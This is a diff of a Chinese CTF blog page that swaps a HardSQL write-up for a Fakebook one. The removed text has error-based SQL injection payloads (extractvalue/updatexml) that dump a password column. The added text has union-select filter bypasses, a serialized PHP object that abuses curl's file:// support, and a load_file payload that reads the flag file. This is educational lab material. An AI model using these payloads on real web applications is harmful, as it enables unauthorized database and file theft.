@@ -17,7 +17,7 @@
   <meta name="description" content="BLOG">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>BUU每日一题021 - lll-nnnのblog</title>
+  <title>BUU每日一题022 - lll-nnnのblog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -162,7 +162,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="BUU每日一题021">
+            <span class="h2" id="subtitle" title="BUU每日一题022">
               
             </span>
 
@@ -172,8 +172,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-02-04 12:14" pubdate>
-        2021年2月4日 中午
+      <time datetime="2021-02-05 15:27" pubdate>
+        2021年2月5日 下午
       </time>
     </span>
   
@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      501 字
+      721 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      6
+      10
        分钟
     </span>
   
@@ -224,30 +224,81 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">BUU每日一题021</h1>
+            <h1 style="display: none">BUU每日一题022</h1>
             
             <div class="markdown-body">
-              <h2 id="二十一、"><a href="#二十一、" class="headerlink" title="二十一、"></a>二十一、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[极客大挑战 2019]HardSQL<br><img src="https://ftp.bmp.ovh/imgs/2021/02/a691058ea35deb23.png" srcset="/img/loading.gif">     </p>
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><code>1&#39;</code>报错<br><code>1&#39;#</code>没有报错<br>应该是单引号吧<br><code>1&#39; order by 1#</code><br><img src="https://ftp.bmp.ovh/imgs/2021/02/bb1b936889bdfec4.png" srcset="/img/loading.gif"><br>又是过滤select、or、and、空格、=…….<br>又过滤了好多<br>1^1正常，<code>^</code>没有被过<br>看wp说用报错注入<code>extractvalue</code>或者<code>updatexml</code><br><code>空格</code>用括号<br><code>=</code>可以用<code>like</code>代替         </p>
-<h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>0x7e=’~’<br><code>1%27^extractvalue(1,concat(0x7e,(select(database())),0x7e))%23</code>获取当前库 <img src="https://ftp.bmp.ovh/imgs/2021/02/03a9b87ac4eb570b.png" srcset="/img/loading.gif"><br><code>1%27^extractvalue(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e))%23</code>获取表   <img src="https://ftp.bmp.ovh/imgs/2021/02/57ffbf2ef4fe4254.png" srcset="/img/loading.gif"><br><code>1%27^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e))%23</code>列  <img src="https://ftp.bmp.ovh/imgs/2021/02/83d7e8bc9bed4cec.png" srcset="/img/loading.gif"><br><code>1%27^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e))%23</code>password<img src="https://ftp.bmp.ovh/imgs/2021/02/0133a6c9f86e4091.png" srcset="/img/loading.gif"><br>可以看到只有一部分<br>可以利用<code>right()</code>函数获取剩余部分<br><code>1%27^extractvalue(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1)),0x7e))%23 </code><br><img src="https://ftp.bmp.ovh/imgs/2021/02/8f2b93bb89cadc01.png" srcset="/img/loading.gif">     </p>
-<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul>
-<li><p><code>right()</code>函数       </p>
+              <h2 id="二十二、"><a href="#二十二、" class="headerlink" title="二十二、"></a>二十二、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[网鼎杯 2018]Fakebook<br><img src="https://ftp.bmp.ovh/imgs/2021/02/60fda5da538b4fed.png" srcset="/img/loading.gif"></p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>转了一圈没发现什么信息，先join注册一个看看吧<br>注册后发现自己的用户名可以点<br>点进去<img src="https://ftp.bmp.ovh/imgs/2021/02/e439ef5ab0af2a57.png" srcset="/img/loading.gif"><br>url中有<code>?no=1</code>加上个单引号—–报错<br>可以注入<code>?no=2/2</code>返回原来的界面—判断是数字型注入<br>经测试，union和select连在一起被过滤，可以<code>union/**/select</code>绕过<br><code>?no=2 union/**/select 1,2,3,4%23</code>看回显位<br><img src="https://ftp.bmp.ovh/imgs/2021/02/83843e2428edd86c.png" srcset="/img/loading.gif"><br>可以看到是<code>2</code>位，接下来在<code>2</code>位上做文章<br><code>?no=2 union/**/select 1,(select database()),3,4%23</code>看库名——-<code>fakebook</code><br><code>?no=2 union/**/select 1,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;fakebook&#39;),3,4%23</code>表名——<code>users</code><br><code>?no=2 union/**/select 1,(select group_concat(column_name)from information_schema。columss where table_name=&#39;users&#39;),3,4%23</code>列名 <img src="https://ftp.bmp.ovh/imgs/2021/02/ba2c9bb3cf8aa2b0.png" srcset="/img/loading.gif"><br>有个data<img src="https://ftp.bmp.ovh/imgs/2021/02/e5ac564e3185f08b.png" srcset="/img/loading.gif"><br>是一串序列化后的字节流<br>在robots.txt中发现<code>/user.php.bak</code>,得到一个文件，是源码</p>
+<pre><code>&lt;?php
+
+
+class UserInfo
+&#123;
+    public $name = &quot;&quot;;
+    public $age = 0;
+    public $blog = &quot;&quot;;
+
+    public function __construct($name, $age, $blog)
+    &#123;
+        $this-&gt;name = $name;
+        $this-&gt;age = (int)$age;
+        $this-&gt;blog = $blog;
+    &#125;
+
+    function get($url)
+    &#123;
+        //创建一个新的curl资源
+        $ch = curl_init();
+
+        设置url和相应的选项
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);         //如果CURLOPT_RETURNTRANSFER作为一个选项被设置到一个具体的句柄，那么这个函数将会以字符串的形式返回那个cURL句柄获取的内容。
+        $output = curl_exec($ch);     //抓取url并把它传递给浏览器
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        if($httpCode == 404) &#123;
+            return 404;
+        &#125;
+        curl_close($ch);       //关闭curl资源，并且释放系统资源
+
+        return $output;
+    &#125;
+
+    public function getBlogContents ()
+    &#123;
+        return $this-&gt;get($this-&gt;blog);
+    &#125;
+
+    public function isValidBlog ()
+    &#123;
+        $blog = $this-&gt;blog;
+        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);
+    &#125;
+
+&#125;        </code></pre>
+<p>大致意思就是get函数链接blog的url，将url返回的数据输出到页面上<br>curl是支持file协议的，而且sql注入的时候也得到了路径<br>本题还有个flag.php，wp说御剑能扫出来，但我扫不出来<br>data中是以序列化存储信息的，查询时要先反序列化，然后得到url<br>如果让它查询返回的包含<code>file:///var/www/html/flag.php</code>就可以得到flag<br>构造序列化字符串   </p>
+<pre><code>&lt;?php
+
+class UserInfo
+&#123;
+    public $name = &quot;1&quot;;
+    public $age = 0;
+    public $blog = &quot;file:///var/www/html/flag.php&quot;;
+
+&#125;
+
+$a = new UserInfo();
+echo serialize($a);
+?&gt;</code></pre>
+<p><code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</code>          </p>
+<h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>?no=2 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;%23</code><br>源码中得到flag<br><img src="https://ftp.bmp.ovh/imgs/2021/02/d8a4939109cd9d6b.png" srcset="/img/loading.gif"></p>
+<h3 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h3><p>sql注入可以用报错注入      </p>
+<hr>
+<p>MySQL的load_file函数</p>
 <blockquote>
-<p>right(s,n):返回字符串s的后n位<br>left(s,n):返回字符串s的前n位          </p>
+<p><code>LOAD_FILE(file_name) </code><br> 其中file_name是文件的完整路径。</p>
 </blockquote>
-</li>
-<li><p>extractvalue函数        </p>
-<blockquote>
-<p>语法：<code>extractvalue(xml_document,Xpath_string)</code><br>第一个参数：xml_document是string格式<br>第二个参数：Xpath_string是xpath格式的字符串<br>作用：从目标xml中返回包含所查询的字符串<br>利用：如果第二个参数不满足要求，则会报错，并且将查询结果放在报错信息中<br>payload：<code>id=&#39;and(select extractvalue(1,concat(&#39;~&#39;,(sql语句))))</code><br>‘~’也可以换成’#’、’$’等不满足xpath格式的字符<br>extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位             </p>
-</blockquote>
-</li>
-<li><p>updatexml函数         </p>
-<blockquote>
-<p>语法：<code>updatexml(xml_document,xpath_string,new_value)</code><br>第一个参数：xml_document是string格式，为xml文档对象的名称<br>第二个参数：xpath_string是xpath格式的字符串<br>第三个参数：new_value是string格式，替换查找到的负荷条件的数据<br>作用：改变文档中符合条件的节点的值<br>第二个参数跟extractvalue函数的第二个参数一样，因此也可以利用，且利用方式相同<br>payload：<code>1&#39;or(updatexml(1,concat(&#39;~&#39;,(sql语句)),1))%23</code>      </p>
-</blockquote>
-</li>
-</ul>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">十种MySQL报错注入</a></p>
+<p>payload:<code>?no=100 union/**/select 1,load_file(&#39;/var/www/html/flag.php&#39;),3,4 #</code>       </p>
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>curl<img src="https://ftp.bmp.ovh/imgs/2021/02/b43bf24ea303eb35.png" srcset="/img/loading.gif"><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/TM_1024/article/details/107045217?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161250725916780299095581%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=161250725916780299095581&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-5-107045217.pc_search_result_no_baidu_js&utm_term=%255B%25E7%25BD%2591%25E9%25BC%258E%25E6%259D%25AF+2018%255DFakebook">MORE</a></p>
 
             </div>
             <hr>
@@ -271,18 +322,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/02/05/BUU022/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">BUU每日一题022</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/02/03/BUU020/">
-                        <span class="hidden-mobile">BUU每日一题020</span>
+                      <a href="/2021/02/04/BUU021/">
+                        <span class="hidden-mobile">BUU每日一题021</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
